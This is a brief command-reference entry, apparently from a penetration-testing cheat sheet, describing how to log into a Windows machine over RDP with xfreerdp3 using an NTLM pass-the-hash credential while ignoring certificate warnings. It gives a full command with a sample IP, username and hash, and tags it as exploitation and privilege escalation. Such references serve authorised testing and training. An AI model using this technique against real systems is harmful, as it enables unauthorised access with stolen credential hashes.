---
description: Connect to a remote Windows desktop via RDP using NTLM Pass-the-Hash authentication, bypassing certificate warnings.

Command Reference:
    Target IP: 10.10.10.1
    Domain: N/A
    Username: john
    Hash: 580B16D486D8D2CAFA00B314D41FA396 (NTLM hash)

command: |
  xfreerdp3 /v:10.10.10.1 /u:john /pth:580B16D486D8D2CAFA00B314D41FA396 /cert:ignore

items:
  - Hash

services:
  - NTLM

OS:
  - Windows

attack_types:
  - Exploitation
  - PrivEsc

references:
  - https://github.com/FreeRDP/FreeRDP
  - https://www.kali.org/tools/freerdp3/#xfreerdp3
---
